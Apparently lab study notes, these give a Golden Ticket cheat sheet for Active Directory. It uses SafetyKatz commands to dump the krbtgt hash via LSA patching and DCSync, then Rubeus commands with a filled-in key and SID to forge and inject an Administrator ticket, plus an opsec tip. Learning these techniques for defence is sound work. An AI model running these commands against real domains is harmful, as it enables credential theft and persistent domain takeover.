# Golden Ticket  

Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz 

## SafetyKatz

```powershell 
❯ C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'    # Execute mimikatz (variant) on DC as DA to get krbtgt hash 

❯ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"  # To use the DCSync feature for getting AES keys for krbtgt account, use this command with DA privileges 
```

## Rubeus 

```powershell 
# Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
❯ C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd

Notes:
	1. Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
		1. To retrieve flags for user specified in /user.
		2. To retrieve /groups, /pgid, /minpassage and /maxpassage
		3. To retrieve /netbios of the current domain
	2. If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).
```

```powershell 
# The Golden ticket forging command looks like this:
❯ C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

[![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
[![Golden-Ticket-Rubeus2.png | 900 ](https://i.postimg.cc/0jjtcDqV/Golden-Ticket-Rubeus2.png)](https://postimg.cc/p5NYd9rj)


